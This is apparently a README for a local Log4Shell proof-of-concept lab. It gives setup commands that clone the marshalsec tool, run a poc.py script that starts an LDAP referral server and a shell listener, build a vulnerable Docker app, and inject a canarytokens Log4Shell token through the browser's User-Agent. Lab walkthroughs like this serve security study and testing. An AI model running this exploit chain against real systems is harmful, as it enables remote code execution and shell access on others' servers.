
# How to Run this Program

- First, download and install the archived jdk 1.8

- Second, clone `marshalsec` : `git clone https://github.com/mbechler/marshalsec.git`

```shell
cp -r /Library/Java/JavaVirtualMachines/jdk1.8.0_20.jdk/Contents/Home .

mv Home jdk1.8.0_20

python3 poc.py

# get the inet address of your local machine
ifconfig en0 | grep inet | awk '$1=="inet" {print $2}'

# [+] Enter IP for LDAPRefServer & Shell: enter the inet address like 10.0.0.17

# [+] Enter listener port for LDAPRefServer: 8000

# [+] Set listener port for shell: 9001

docker build -t log4j-shell-poc .

docker run -d -p 127.0.0.1:8080:8080 log4j-shell-poc

# get the current image's container ID
docker ps

# log the docker instance
docker logs -f --tail=10 <CONTAINER ID>

docker exec -i -t <CONTAINER ID> /bin/bash

```

- Go to [http://localhost:8080/](http://localhost:8080/)

- You should see the log in page now!

- Open [canarytokens](https://canarytokens.org/generate), select `Select your token` => `Log4Shell`

- Open [temp-mail](https://temp-mail.org/), copy the temporary E-mail address

- Go back to [canarytokens](https://canarytokens.org/generate), paste the temporary E-mail address, enter a random reminder note like "log4j shell test", then create the token

- Copy the token, and change the browser's user agent to the token ( don't forget to refresh!!! )

- Enter random user name & password like "user" & "123456"

- Go back to your temp-mail page, pop up the docker log window, wait for the attack to end

- After the attack execution, you should see the alert e-mail on the temp-mail page and detailed info on your canarytokens page







